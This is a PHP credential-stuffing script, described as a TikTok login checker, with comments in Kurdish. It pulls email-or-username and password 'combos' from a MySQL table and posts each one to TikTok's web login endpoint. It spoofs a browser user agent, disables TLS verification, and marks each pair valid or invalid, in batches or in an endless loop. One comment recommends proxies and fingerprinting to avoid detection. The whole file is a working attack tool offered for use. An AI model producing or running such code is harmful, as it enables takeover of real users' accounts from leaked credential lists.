<?php
// TikTok login checker - بەکار بهێنە بە مەبەستی خۆت
function checkTikTokCombo($email_or_user, $password) {
    $data = [
        'user_name' => $email_or_user,
        'password' => $password
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.tiktok.com/passport/web/account/login/');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookies.txt');
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    // لێکۆڵینەوەی سادە - لە ڕاستیدا proxies و fingerprint بەکار بهێنە
    if ($httpCode === 200 && strpos($response, 'user uniquename') !== false) {
        return true; // دروست
    }
    
    return false; // نادرست
}

// Main checker loop
$pdo = new PDO('mysql:host=localhost;dbname=tiktok_checker', 'root', '');
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

if (isset($_GET['start'])) {
    // هەموو pending combos وەربگرە
    $stmt = $pdo->prepare("SELECT * FROM combos WHERE status = 'pending' LIMIT 10");
    $stmt->execute();
    $combos = $stmt->fetchAll(PDO::FETCH_ASSOC);
    
    foreach ($combos as $combo) {
        $status = checkTikTokCombo($combo['email_or_user'], $combo['password']) ? 'valid' : 'invalid';
        
        $updateStmt = $pdo->prepare("UPDATE combos SET status = ?, checked_at = NOW() WHERE id = ?");
        $updateStmt->execute([$status, $combo['id']]);
        
        // Live status
        echo json_encode([
            'checked' => $combo['email_or_user'],
            'status' => $status
        ]);
        
        sleep(2); // Rate limiting
    }
} else {
    // Continuous checking
    while (true) {
        $stmt = $pdo->prepare("SELECT * FROM combos WHERE status = 'pending' LIMIT 1");
        $stmt->execute();
        $combo = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if (!$combo) {
            sleep(5);
            continue;
        }
        
        $status = checkTikTokCombo($combo['email_or_user'], $combo['password']) ? 'valid' : 'invalid';
        
        $updateStmt = $pdo->prepare("UPDATE combos SET status = ?, checked_at = NOW() WHERE id = ?");
        $updateStmt->execute([$status, $combo['id']]);
        
        sleep(3);
    }
}
?>
